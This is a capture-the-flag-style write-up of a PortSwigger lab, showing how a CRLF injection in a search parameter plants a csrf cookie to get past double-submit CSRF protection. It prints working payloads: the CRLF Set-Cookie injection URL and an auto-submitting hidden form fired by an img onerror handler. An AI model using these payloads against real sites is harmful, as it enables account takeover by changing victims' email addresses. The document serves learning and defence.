# Lab: CSRF where token is duplicated in cookie

## 📌 Lab Information

- **Platform:** PortSwigger Web Security Academy
- **Category:** Cross-Site Request Forgery (CSRF)
- **Difficulty:** Practitioner
- **Lab:** CSRF where token is duplicated in cookie
- **Status:** Solved ✅

---

# 🎯 Objective

The objective of this lab is to exploit a CSRF vulnerability in the email change functionality.

The application attempts to protect against CSRF using the **Double Submit Cookie** technique, where the CSRF token is duplicated in both:

- A cookie
- A request parameter

The goal is to use the **Exploit Server** to host an HTML page that automatically changes the victim's email address.

---

# 🔍 Reconnaissance

The application provides an account:

```text
Username: wiener
Password: peter
```

After logging in, navigate to the account page and test the email change functionality.

The relevant endpoint is:

```http
POST /my-account/change-email
```

A typical request contains:

```http
POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=...; csrf=...

email=test@example.com&csrf=...
```

There are three important values:

```text
session
csrf cookie
csrf parameter
```

---

# 🧠 Understanding the CSRF Protection

The application uses the **Double Submit Cookie** technique.

The same CSRF value appears in two locations:

```text
Cookie:
csrf=ABC123
```

and:

```text
POST parameter:
csrf=ABC123
```

The server effectively performs a check similar to:

```text
Cookie csrf == POST csrf
```

If the values match, the request is accepted.

The important weakness is that the application assumes the attacker cannot control the victim's `csrf` cookie.

---

# 🧪 Testing the CSRF Token

After submitting the email change request through Burp Suite, inspect the request.

We can observe:

```text
Cookie:
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

and:

```text
POST:
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

The same value is duplicated.

Therefore:

```text
csrf cookie
      ↓
      ↕
csrf parameter
```

This confirms the use of the Double Submit Cookie technique.

---

# 🔎 Finding Cookie Injection

The next step is to determine whether we can influence the `csrf` cookie.

The application's search functionality reflects user input into a response header.

For example, the application can be manipulated using:

```text
%0d%0a
```

which represents:

```text
CRLF
```

CRLF can be used in the lab to inject an additional HTTP header.

The injected header is:

```http
Set-Cookie: csrf=...
```

Therefore, instead of relying on the victim already having the required CSRF cookie, we can make the victim's browser receive our chosen value.

---

# 🧨 Cookie Injection Payload

The payload used in the lab is:

```text
/?search=test%0d%0aSet-Cookie:%20csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp%3b%20SameSite=None
```

After URL decoding, the important part becomes approximately:

```http
Set-Cookie: csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp; SameSite=None
```

The browser therefore receives:

```text
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

---

# 🧩 Building the CSRF Exploit

Now we create a malicious HTML page on the **Exploit Server**.

The page contains a hidden form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">

    <input type="hidden" name="email" value="accker.fucker@gamil.com">
    <input type="hidden" name="csrf" value="m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp">

</form>
```

The form prepares the malicious request:

```text
POST /my-account/change-email
```

with:

```text
email=accker.fucker@gamil.com
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

---

# 🔐 Injecting the CSRF Cookie

We then use an `<img>` element to trigger the cookie injection:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

The attack works in two stages.

### Stage 1 — Set the Cookie

The browser requests:

```text
/?search=...
```

The injected CRLF causes the response to contain:

```http
Set-Cookie: csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

The victim's browser stores the cookie.

---

### Stage 2 — Submit the Form

The image intentionally triggers an error, which executes:

```javascript
document.forms[0].submit()
```

The form is then automatically submitted.

The resulting request contains:

```text
Cookie:
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

and:

```text
POST:
csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp
```

Both values match.

---

# 💥 Final Exploit

The complete exploit is:

```html
<form action="https://0a2d00d40388579f808b99ef00c8008d.web-security-academy.net/my-account/change-email" method="POST">

    <input type="hidden" name="email" value="accker.fucker@gamil.com">
    <input type="hidden" name="csrf" value="m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp">

</form>

<img src="https://0a2d00d40388579f808b99ef00c8008d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=m5Jj9YP8Qd4xFKTzQD5dvhanVIZLvOGp%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

The important relationship is:

```text
Injected Cookie
       ↓
csrf=ABC
       │
       │ matches
       ↓
POST Parameter
csrf=ABC
```

---

# 🔄 Attack Flow

The complete attack can be represented as:

```text
Attacker
   │
   ▼
Create malicious HTML page
   │
   ▼
Victim opens exploit
   │
   ▼
GET /?search=...CRLF...Set-Cookie
   │
   ▼
Victim browser receives csrf cookie
   │
   ▼
csrf=ATTACKER_VALUE
   │
   ▼
JavaScript submits hidden form
   │
   ▼
POST /my-account/change-email
   │
   ├── Cookie csrf = ATTACKER_VALUE
   │
   └── POST csrf   = ATTACKER_VALUE
   │
   ▼
Values match
   │
   ▼
CSRF protection bypassed
   │
   ▼
Victim's email is changed
```

---

# 🧠 Why Does the Attack Work?

The vulnerability exists because the application relies on the following condition:

```text
csrf cookie == csrf parameter
```

Instead of having a CSRF token that is securely associated with the user's authenticated session.

The attacker is able to influence the victim's `csrf` cookie through the cookie injection vulnerability.

Therefore, the attacker can choose:

```text
csrf = ABC123
```

and send the same value in the request:

```text
Cookie: csrf=ABC123
```

```text
POST: csrf=ABC123
```

The server sees:

```text
ABC123 == ABC123
```

and accepts the request.

---

# 🔐 Secure vs Vulnerable Design

### ❌ Vulnerable Design

```text
csrf cookie
      ↕
csrf parameter
```

The server only checks whether the two values match.

---

### ✅ Stronger Design

A CSRF token should be associated with the authenticated user/session:

```text
Session
   │
   ▼
CSRF Token
   │
   ▼
Validate Request
```

The server should ensure that the token belongs to the current authenticated context and cannot simply be replaced by an attacker-controlled value.

---

# ⚔️ Exploitation Steps

1. Log in using:

```text
wiener:peter
```

2. Navigate to the email change functionality.

3. Capture the request using Burp Suite.

4. Identify the `csrf` cookie.

5. Identify the `csrf` POST parameter.

6. Confirm that both contain the same value.

7. Investigate the search functionality.

8. Identify that the search parameter can be used to inject a `Set-Cookie` header through CRLF.

9. Create an Exploit Server page.

10. Add a hidden form targeting:

```text
/my-account/change-email
```

11. Set the `email` field to a new email address.

12. Set the `csrf` parameter to the chosen token.

13. Use the search endpoint to inject the same value into the victim's `csrf` cookie.

14. Automatically submit the form using:

```javascript
document.forms[0].submit()
```

15. Store the exploit.

16. Click **Deliver to victim**.

17. The victim's email address is changed.

---

# 🛠️ Tools Used

- Burp Suite
  - Proxy
  - HTTP history
  - Repeater
- PortSwigger Exploit Server
- Browser
- HTML
- HTTP cookies
- CRLF injection

---

# 🔬 Key Technical Concepts

## 1. CSRF

Cross-Site Request Forgery allows an attacker to cause an authenticated user's browser to perform an unwanted state-changing action.

---

## 2. Double Submit Cookie

A CSRF token is submitted twice:

```text
Cookie
+
Request parameter
```

The server compares the two values.

---

## 3. Cookie Injection

The attacker is able to cause the victim's browser to receive a chosen cookie value.

In this lab:

```http
Set-Cookie: csrf=ATTACKER_VALUE
```

---

## 4. CRLF Injection

The payload:

```text
%0d%0a
```

represents:

```text
CRLF
```

and is used in this lab to inject a new response header.

---

## 5. SameSite

The exploit uses:

```text
SameSite=None
```

to allow the cookie to be sent in a cross-site context required by the lab's attack flow.

---

# 🧠 Key Lessons

- A CSRF token by itself does not automatically make an application secure.
- The security of the Double Submit Cookie technique depends on preventing attackers from controlling the CSRF cookie.
- Always inspect where CSRF tokens are stored.
- Compare the token in the cookie with the token in the request.
- Test whether cookies can be influenced through other application functionality.
- CRLF injection can sometimes be chained with CSRF to bypass protections.
- In real-world bug bounty testing, look for vulnerabilities that can be chained together rather than testing each endpoint in isolation.

---

# 🏁 Final Takeaway

The application uses the **Double Submit Cookie** technique:

```text
csrf cookie == csrf parameter
```

However, the application also contains a **CRLF-based cookie injection** vulnerability.

This allows the attacker to set the victim's:

```text
csrf cookie
```

to the same value used in the forged request.

The final attack becomes:

```text
Cookie Injection
       +
Double Submit Cookie
       +
CSRF
       ↓
CSRF Protection Bypass
       ↓
Victim's email changed
```

The core lesson from this lab is that **CSRF protection must consider whether an attacker can influence the token source itself**. A simple equality check between a cookie and a request parameter is not sufficient when the attacker can control the cookie.